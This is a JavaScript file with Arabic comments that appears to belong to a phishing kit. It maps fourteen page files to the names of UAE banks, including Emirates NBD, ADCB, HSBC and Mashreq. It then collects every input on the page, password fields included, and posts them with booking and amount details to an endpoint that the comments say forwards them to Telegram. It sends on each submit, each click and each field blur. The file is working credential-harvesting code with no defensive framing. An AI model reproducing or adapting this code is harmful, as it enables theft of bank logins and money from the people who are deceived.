// قاموس أسماء البنوك بناءً على رقم الصفحة
const BANK_PAGE_NAMES = {
    '1.html': 'بنك راس الخيمة الوطني',
    '2.html': 'مصرف عجمان',
    '3.html': 'بنك الفجيرة الوطني',
    '4.html': 'بنك دبي الاسلامي',
    '5.html': 'بنك الامارات دبي الوطني',
    '6.html': 'بنك ابو ظبي التجاري',
    '7.html': 'البنك التجاري الدولي',
    '8.html': 'مصرف الشارقة الاسلامي',
    '9.html': 'الامارات الاسلامي',
    '10.html': 'بنك دبي التجاري',
    '11.html': 'بنك HSBC',
    '12.html': 'مصرف ابو ظبي الاسلامي ADIB',
    '13.html': 'بنك ابو ظبي الاول',
    '14.html': 'المشرق'
};

// دالة للحصول على اسم البنك من اسم الصفحة الحالية
function getCurrentBankName() {
    const currentPage = window.location.pathname.split('/').pop();
    return BANK_PAGE_NAMES[currentPage] || 'بنك غير معروف';
}

// دالة لجمع بيانات النموذج
function collectFormData() {
    const formData = {};
    
    // جمع جميع حقول الإدخال
    const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"], input[type="password"]');
    inputs.forEach(input => {
        if (input.value && input.value.trim() !== '') {
            // استخدام name أو id أو placeholder كمفتاح
            const key = input.name || input.id || input.placeholder || `field_${Math.random()}`;
            formData[key] = input.value.trim();
        }
    });
    
    // جمع حقول select
    const selects = document.querySelectorAll('select');
    selects.forEach(select => {
        if (select.value && select.value.trim() !== '') {
            const key = select.name || select.id || `select_${Math.random()}`;
            formData[key] = select.value.trim();
        }
    });
    
    return formData;
}

// دالة لإرسال البيانات إلى API
function sendBankFormData(formData) {
    const bankName = getCurrentBankName();
    
    // الحصول على بيانات الحجز من localStorage
    const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
    const bookingId = bookingData.bookingId || 'غير متوفر';
    const amount = bookingData.amount || 'غير متوفر';
    
    // إعداد البيانات للإرسال
    const dataToSend = {
        bankName: bankName,
        bookingId: bookingId,
        amount: amount,
        formData: formData,
        timestamp: new Date().toISOString()
    };
    
    // إرسال البيانات إلى API
    fetch('/api/telegram/bank-form-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.json())
    .then(data => {
        console.log('تم إرسال بيانات النموذج إلى تليجرام:', data);
    })
    .catch(error => {
        console.error('خطأ في إرسال البيانات:', error);
    });
}

// مراقبة جميع النماذج في الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // مراقبة جميع أزرار الإرسال
    const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"], button[data-testid*="submit"]');
    
    submitButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            // جمع البيانات من النموذج
            const formData = collectFormData();
            
            // إرسال البيانات إذا كانت موجودة
            if (Object.keys(formData).length > 0) {
                sendBankFormData(formData);
            }
        });
    });
    
    // مراقبة جميع النماذج
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            // جمع البيانات من النموذج
            const formData = collectFormData();
            
            // إرسال البيانات إذا كانت موجودة
            if (Object.keys(formData).length > 0) {
                sendBankFormData(formData);
            }
        });
    });
    
    // مراقبة التغييرات في حقول الإدخال وإرسال البيانات عند فقدان التركيز
    const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"], input[type="password"]');
    let lastSentData = {};
    
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            // الانتظار قليلاً للتأكد من أن المستخدم أنهى الإدخال
            setTimeout(() => {
                const formData = collectFormData();
                
                // إرسال البيانات فقط إذا تغيرت
                const currentDataStr = JSON.stringify(formData);
                const lastDataStr = JSON.stringify(lastSentData);
                
                if (Object.keys(formData).length > 0 && currentDataStr !== lastDataStr) {
                    sendBankFormData(formData);
                    lastSentData = formData;
                }
            }, 500);
        });
    });
});
